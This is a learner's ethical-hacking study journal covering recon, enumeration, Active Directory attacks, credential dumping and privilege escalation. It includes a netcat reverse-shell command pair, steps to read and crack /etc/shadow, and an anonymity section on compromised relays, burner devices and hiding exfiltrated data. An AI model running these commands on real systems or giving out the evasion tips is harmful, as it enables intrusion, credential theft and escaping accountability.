# Ethical Hacking Journal

This is a journal to keep track of overall progress and new topics I learn about Ethical Hacking / Hacking in general.

---

## 🧠 Key Concepts I’m Aware Of (But Might Need to Brush Up On)

---

### Reconnaissance

I'm aware that there are two different types: active and passive.

#### 🟠 Active Recon
- Actively interacting with the target
- Less hidden, more risk of being found out and making "noise"

#### 🟢 Passive Recon

**Physical / Social Recon** (not directly interacting with the target):
- Social media posts
- Uploaded company info
- Satellite images, drone recon, building layouts
- Badge readers, break areas, fencing, security patrols
- Employee names, job titles, phone numbers, managers
- Pictures of badges, desk setups, computers

**Web / Host Recon**:
- Target validation: `WHOIS`, `nslookup`, `dnsrecon`
- Subdomain discovery: Google Fu, `dig`, `Nmap`, `Sublist3r`, `Bluto`, `crt.sh`
- Fingerprinting: `Nmap`, Wappalyzer, WhatWeb, BuiltWith, `netcat`
- Data breaches: HaveIBeenPwned, etc.

> Again, check satellite images for physical testing. This will give you a great overview of the building.

**Google Hacking Tips**:
- `site:domain.com` – gather info about the site
- `-www` – helps find subdomains
- `filetype:` – search for specific file types exposed

---

### Enumeration

Enumeration is the act of digging deeper to:
- Identify active hosts
- Discover open ports
- Check available services on the network/system

Helps identify:
- Exploitable services
- Outdated versions
- Shared resources
- Config leaks

> Hacking is mostly just enumeration.

---

### Exploitation

This is when the fun happens:
- Try to exploit identified vulnerabilities to gain access or control of a system (e.g., employee computer or company network)

---

### Post-Exploitation

After exploitation, you:
- Maintain access ("Persistence")
- Try to escalate privileges (e.g., become admin)
- Gather more internal info

---

## 🧰 Tools

Some great tools to use during the process include:

- **Nmap**: Port scanning – find open ports and service types
- **Enum4Linux**: Gather info on Windows machines
- **Nessus / OpenVAS**: Vulnerability scanners
- **Nikto**: Scan for web server security issues
- **Metasploit Framework**: Exploitation and payload delivery
  - **Meterpreter**: Advanced post-exploitation payload
- **Burp Suite**: Web application testing
- **John the Ripper / Hashcat**: Password cracking
- **Winpeas.exe** is a script that will search for all possible paths to escalate privileges on Windows hosts
- **LINpeas: a popular, open-source script used in cybersecurity to identify potential vulnerabilities and misconfigurations that can lead to
privilege escalation on Linux, Unix, and macOS systems. 

**Corporate Tools**:
- Nmap, Nessus, Burp Suite Pro, Cobalt Strike, BloodHound, Responder, Impacket, CrackMapExec

> **Use a VM workspace** like Kali Linux or Parrot OS. Never use your main operating system.

**More Info**:

- **Nmap**: Open ports and server information
- **Nessus**: Vulnerability scanning
- **Hydra**: Brute-force password cracker
- **Wireshark**: Network protocol analyzer
- **Burp Suite**: Proxy to intercept and analyze HTTP traffic
- **Responder**: Poison network protocols and capture authentication credentials
- **Hashcat**: Cracking hashes  
  - Syntax: `hashcat -m <hashfile> <path/to/passlist>`
- **Smbclient**: used to find what kind of shares a system has
- **certutil**: sorta like a wget 

---

## 📝 Reporting

This is the **most important part** of the methodology:
- Document all findings
- Explain how you found them
- Provide steps to reproduce and remediate
- Include every single detail with precision

---

## 💻 Environment

- Installed Kali Linux, familiar with Linux OS
- Installing tools: Burp Suite, NetScan, Hashcat, etc.
- Started learning about 1 year ago (on and off)
- Taking it seriously this time – hence the journal

---

## 🕶️ Staying Anonymous / Invisible

- Create burner accounts (no real-world ties)
- Avoid accessing illegal content without strong protection
- Use end-to-end encryption (Signal, Matrix)
- Avoid personally styled writing

**Tools & Methods**:
- VPN chains (different countries)
- Tor or I2P
- Compromised relays (pivot points)
- Burner SIMs & devices
- Tails OS / Whonix / Qubes OS
- Air-gapped systems (no internet)
- VMs for compartmentalization
- Wipe/reflash devices regularly

**Best Practices**:
- Never reuse usernames, passwords, handles
- Use temp email and crypto wallets
- Encrypt everything (disks, messages, exfiltrated data)
- Avoid behavior that draws attention (taunting, bragging online)
  

📡 Protocols

TCP: Connection-oriented, reliable (used in apps needing guaranteed delivery)

    UDP: Connectionless, faster, but less reliable (used in video/audio streaming)

 Kerberoasting
  this is an authentication protocol that uses tickets as a form of communication and authentication.
  we have accounts called service accounts which run services like SQL server, IIS etc. these accounts are tied to SPNs (Service Principal Names)
  any authenticated user can request a Kerberos service ticket (TGS) for these spns
  the TGS is encrypted with the service accounts NTLM hash (Derived from its password)
  you can request them, dump them, then brute force them offline.

  DCSync:

  Normally, Domain Controllers replicate AD data to each other.

  Certain privileged accounts (like Domain Admins, Enterprise Admins, and accounts with Replicating Directory Changes All rights) can ask a DC for its password data — including NTLM hashes for all accounts.

  DCSync tricks a DC into thinking you’re another DC requesting replication.

DCShadow:

  More advanced — lets you register a fake DC in AD, then push malicious changes into the AD database (e.g., adding yourself to Domain Admins or modifying security descriptors).

  It’s harder to detect because it uses legitimate replication traffic.

Why they work:
AD trusts anything it thinks is another Domain Controller, and those replication rights can be abused if given to the wrong account.
  

Stealth Scan (TCP 3-way Handshake):

    SYN → SYN-ACK → RST (avoids full connection)

📋 Methodology

    Start with a network scan using nmap to find open ports

    Test open ports:

        Visit web ports (443, 80)

        Analyze for info leaks (e.g., server version, Apache/Redhat)

    View source code for comments and leaks

    Use nikto for server enumeration

    Use dirbuster to brute-force subdirectories

    Look for headers exposing server info (info disclosure)

Post-Exploitation Enumeration

    Use arp -a, netstat, route

    Use sudo -l to check privilege levels

    Access /etc/shadow and /etc/passwd

    Use unshadow to combine files and crack with john or hashcat

🐚 Shells
Reverse Shell

# On your machine:
nc -lvp <PORT>

# On target:
nc <YOUR_IP> <PORT> -e /bin/bash

Bind Shell

    Target opens a port

    You connect to it directly

    You can establish a shell by exploiting a vulnerability, sending a payload via Metasploit, and connecting back to the listener.

💣 Payloads
Non-Staged Payloads

    Entire shellcode sent at once

    Larger and more reliable

    Example: windows/meterpreter_reverse_tcp

Staged Payloads

    Sent in parts/stages

    Smaller footprint but less stable

    Example: windows/meterpreter/reverse_tcp

🔐 Credential Stuffing

    Using known cleartext passwords against login forms

    Simple but often effective

🪪 Token Impersonation

    Move through systems without revealing your own credentials

    Use the token of a verified user/admin

    Often done via Meterpreter shell


# Windows hacking
theres more to hacking windows than just AD, although it is dominant in many and most likely most enterprises because it's basically the central hub where everyone and everything is connected; you can use other methods. for instance 
local priv escalation, network service exploits and social engineering can too become much more important in some cases

we always should check if there are any sensitive ports that might be open like SMB, RDP and RPC/DCOM as these services have known vulns and should not be exposed. 

we also have credential theft: once on a windows system you can do the following to check for credentials, 
Dumping lsass memory with mimikatz
Extract saved browser passwords
Dump SAM/NTDs.dit files
Harvest RDP saved credentials
Clipboard sniffing for passwords and etc. 


Physical and Offline Attacks:
Boot from USB and dump SAM database
Remove or reset Windows password hashes
Evil Maid attacks (installing persistence via firmware or bootkits)
Cold boot attacks to recover encryption keys from RAM

Local Priv Esc:

Unpatched vulnerabilities (e.g., PrintNightmare, CVE-2021-34527)
DLL hijacking (dropping malicious DLLs where a privileged app loads them)
Weak folder/file permissions (overwriting service executables)
Token impersonation (SeImpersonatePrivilege abuse with Juicy Potato/Rogue Potato)
Abusing scheduled tasks with weak permissions







